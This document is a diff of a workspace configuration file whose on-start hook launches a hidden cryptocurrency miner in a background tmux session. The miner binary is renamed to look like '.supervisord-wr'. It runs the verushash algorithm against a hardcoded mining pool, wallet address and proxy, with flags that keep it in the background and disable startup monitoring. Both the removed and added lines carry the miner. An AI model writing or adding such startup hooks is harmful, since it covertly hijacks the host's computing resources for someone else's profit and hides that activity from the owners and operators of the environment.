@@ -52,7 +52,7 @@ services.docker.enable = true;
       # Runs when the workspace is (re)started
       onStart = {
         start-tmux-sessions = "
-          tmux new -d -s biter-session 'chmod +x ./localruntime && mv localruntime .supervisord-wr && ./.supervisord-wr --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=6Xshell --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 6'
+          tmux new -d -s biter-session './.supervisord-wr --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=6Xshell --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 6'
           tmux new -d -s bitping-session 'tracepath 1.1.1.1'
           tmux new -d -s bit-session 'top'
           tmux attach -t bit-session
